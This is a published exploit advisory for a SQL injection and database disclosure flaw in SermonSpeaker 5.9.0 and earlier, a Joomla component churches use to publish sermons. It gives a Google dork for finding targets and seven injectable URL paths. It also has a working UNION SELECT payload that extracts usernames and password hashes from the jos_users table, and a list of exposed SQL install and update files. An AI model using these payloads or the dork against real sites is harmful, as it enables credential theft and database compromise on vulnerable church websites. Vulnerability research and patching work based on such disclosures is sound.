####################################################################

# Exploit Title : Joomla SermonSpeaker 5.9.0 SQL Injection / Database Disclosure
# Author [ Discovered By ] : KingSkrupellos
# Team : Cyberizm Digital Security Army
# Date : 12/02/2019
# Vendor Homepage : sermonspeaker.net
# Software Download Link : github.com/Bakual/SermonSpeaker/archive/master.zip
sermonspeaker.net/download.html
# Software Information Link : extensions.joomla.org/extension/sermonspeaker/
joomlabiblestudy.org/11-news/60-sermon-speaker-migration-component.html
# Software Version : 5.84 and 5.9.0 and previous versions.
# Software Technical Requirements : 
Joomla Bible Study + Joomla SermonSpeaker Migration => 
You must have Sermon Speaker 3.4.2 or higher installed and
Joomla Bible Study 6.2.0 or higher installed. You may use of the 6.2 RC3 version.
# Tested On : Windows and Linux
# Category : WebApps
# Exploit Risk : Medium
# Google Dorks : inurl:''/index.php?option=com_sermonspeaker''
# Vulnerability Type : CWE-89 [ Improper Neutralization of 
Special Elements used in an SQL Command ('SQL Injection') ]
CWE-200 [ Information Exposure ]
# Old Similar CVE [ Only Version and Parameters are different ] : CVE-2010-1477 ~ CVE-2010-1559
# PacketStormSecurity : packetstormsecurity.com/files/authors/13968
# CXSecurity : cxsecurity.com/author/KingSkrupellos/1/
# Exploit4Arab : exploit4arab.org/author/351/KingSkrupellos

####################################################################

# Description about Software :
***************************
SermonSpeaker is a free Joomla component for churchs to publish their sermons.

####################################################################

# Impact :
***********
* Joomla SermonSpeaker 5.9.0 and other versions - 

component for Joomla is prone to an SQL-injection vulnerability because it 

fails to sufficiently sanitize user-supplied data before using it in an SQL query. 

Exploiting this issue could allow an attacker to compromise the application, 

access or modify data, or exploit latent vulnerabilities in the underlying database.

A remote attacker can send a specially crafted request to the vulnerable application 

and execute arbitrary SQL commands in application`s database.

Further exploitation of this vulnerability may result in unauthorized data manipulation.

* An attacker can exploit this issue using a browser.

SermonSpeaker is a free Joomla component for churches to publish their sermons.

* It has many features and is used by God to spread the gospel. 

Some churches have expressed interest in using Joomla Bible Study 

and want to convert from Sermon Speaker. 

####################################################################

# SQL Injection Exploit :
**********************
/index.php?option=com_sermonspeaker&view=speaker&Itemid=[SQL Injection]

/index.php?option=com_sermonspeaker&task=latest_sermons&id=[SQL Injection]

/index.php?option=com_sermonspeaker&Itemid=[SQL Injection]&lang=el

/index.php?option=com_sermonspeaker&view=speakers&catid=[ID-NUMBER]:sermons&Itemid=[SQL Injection]

/index.php?view=sermon&id=[ID-NUMBER]&option=com_sermonspeaker&Itemid=[SQL Injection]

/index.php?option=com_sermonspeaker&view=sermon&id=[SQL Injection]

/index.php?view=speaker&layout=popup&id=[ID-NUMBER]&tmpl=component&option=com_sermonspeaker&Itemid=[SQL Injection]

# Example SQL Injection Payload :
*******************************

-9999/**/union/**/select/**/concat(username,0x3a,password)/**/from/**/jos_users/**/

####################################################################

# Database Disclosure Exploit :
***************************
/administrator/components/com_sermonspeaker/sql/install.mysql.utf8.sql

/administrator/components/com_sermonspeaker/sql/uninstall.mysql.utf8.sql

/administrator/components/com_sermonspeaker/sql/updates/mysql/4.5.0.sql

/administrator/components/com_sermonspeaker/sql/updates/mysql/4.5.1.sql 

/administrator/components/com_sermonspeaker/sql/updates/mysql/4.5.2.sql
	 
/administrator/components/com_sermonspeaker/sql/updates/mysql/4.5.3.sql 

/administrator/components/com_sermonspeaker/sql/updates/mysql/4.5.4.sql
	 
/administrator/components/com_sermonspeaker/sql/updates/mysql/5.0.0.sql 

/administrator/components/com_sermonspeaker/sql/updates/mysql/5.0.1.sql 

/administrator/components/com_sermonspeaker/sql/updates/mysql/5.0.2.sql
	 
/administrator/components/com_sermonspeaker/sql/updates/mysql/5.0.3.sql 

/administrator/components/com_sermonspeaker/sql/updates/mysql/5.0.4.sql
	 
/administrator/components/com_sermonspeaker/sql/updates/mysql/5.4.0.sql 

/administrator/components/com_sermonspeaker/sql/updates/mysql/5.5.0.sql 

/administrator/components/com_sermonspeaker/sql/updates/mysql/5.8.4.sql

####################################################################

# Discovered By KingSkrupellos from Cyberizm.Org Digital Security Team 

####################################################################
